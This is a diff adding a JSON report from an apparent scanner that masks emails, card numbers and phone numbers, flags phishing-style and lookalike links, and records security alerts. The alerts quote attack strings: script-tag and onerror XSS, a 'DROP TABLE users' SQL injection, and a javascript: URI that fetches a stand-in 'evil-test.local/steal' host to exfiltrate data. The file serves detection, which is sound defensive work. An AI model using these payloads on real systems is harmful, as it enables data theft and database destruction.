@@ -1,0 +1,146 @@
+{
+  "source_file": "input/raw-text.txt",
+  "emails": [
+    {
+      "masked": "a**************@gmail.com",
+      "alu_category": null,
+      "is_verified_alu": false
+    },
+    {
+      "masked": "a****************@techcorp.co.rw",
+      "alu_category": null,
+      "is_verified_alu": false
+    },
+    {
+      "masked": "j************@yahoo.co.uk",
+      "alu_category": null,
+      "is_verified_alu": false
+    },
+    {
+      "masked": "g********@outlook.com",
+      "alu_category": null,
+      "is_verified_alu": false
+    },
+    {
+      "masked": "d*************@company-mail.rw",
+      "alu_category": null,
+      "is_verified_alu": false
+    },
+    {
+      "masked": "e*******@alueducation.com",
+      "alu_category": "official",
+      "is_verified_alu": true
+    },
+    {
+      "masked": "m************@alumni.alueducation.com",
+      "alu_category": "alumni",
+      "is_verified_alu": true
+    },
+    {
+      "masked": "s*********@si.alueducation.com",
+      "alu_category": "si",
+      "is_verified_alu": true
+    },
+    {
+      "masked": "s******@alueducation.com.verify-now.net",
+      "alu_category": "lookalike",
+      "is_verified_alu": false
+    }
+  ],
+  "card_numbers": [
+    {
+      "masked": "************1111",
+      "issuer": "Visa",
+      "passes_luhn": true
+    },
+    {
+      "masked": "***********0005",
+      "issuer": "Amex",
+      "passes_luhn": true
+    },
+    {
+      "masked": "************9424",
+      "issuer": "Discover",
+      "passes_luhn": true
+    },
+    {
+      "masked": "************9012",
+      "issuer": "Visa",
+      "passes_luhn": false
+    }
+  ],
+  "phone_numbers": [
+    "***-***-8123",
+    "***-***-4567",
+    "***-***-4567",
+    "***-***-0999",
+    "***-***-2445"
+  ],
+  "links": [
+    {
+      "link": "https://www.techcorp.com/cart?step=payment&retry=1",
+      "flagged_as_phishing_style": false
+    },
+    {
+      "link": "http://techcorp.com/checkout-legacy",
+      "flagged_as_phishing_style": false
+    },
+    {
+      "link": "https://mybank.example.com/statements/aug2026.pdf",
+      "flagged_as_phishing_style": false
+    },
+    {
+      "link": "www.techcorp.com/support/ticket/10433",
+      "flagged_as_phishing_style": false
+    },
+    {
+      "link": "http://techcorp.com/newsletter",
+      "flagged_as_phishing_style": false
+    },
+    {
+      "link": "http://evil-test.local/steal?c=",
+      "flagged_as_phishing_style": true
+    },
+    {
+      "link": "https://support.techcorp.com/kb/payment-errors?id=99&lang=en-us",
+      "flagged_as_phishing_style": false
+    },
+    {
+      "link": "https://portal.alueducation.com/payments/fees",
+      "flagged_as_phishing_style": false
+    },
+    {
+      "link": "http://alu-education-support.verify-login.com/reset",
+      "flagged_as_phishing_style": true
+    }
+  ],
+  "security_alerts": [
+    {
+      "threat": "script_injection",
+      "line_excerpt": "this is urgent!! Also saw this weird popup: <script>alert('you won a prize')</script>"
+    },
+    {
+      "threat": "sql_injection",
+      "line_excerpt": "'; DROP TABLE users; -- flagged by WAF, ticket forwarded to security team."
+    },
+    {
+      "threat": "javascript_uri",
+      "line_excerpt": "Malicious payload detected in referrer header: javascript:fetch('http://evil-test.local/steal?c=' + "
+    },
+    {
+      "threat": "inline_js_handler",
+      "line_excerpt": "raw HTML from the error page: <div class='error' onclick=\\\"stealData()\\\">Payment"
+    },
+    {
+      "threat": "inline_js_handler",
+      "line_excerpt": "<img src=x onerror=alert(1)> - confirm this gets flagged, not executed."
+    }
+  ],
+  "totals": {
+    "emails": 9,
+    "card_numbers": 4,
+    "phone_numbers": 5,
+    "links": 9,
+    "security_alerts": 5
+  }
+}
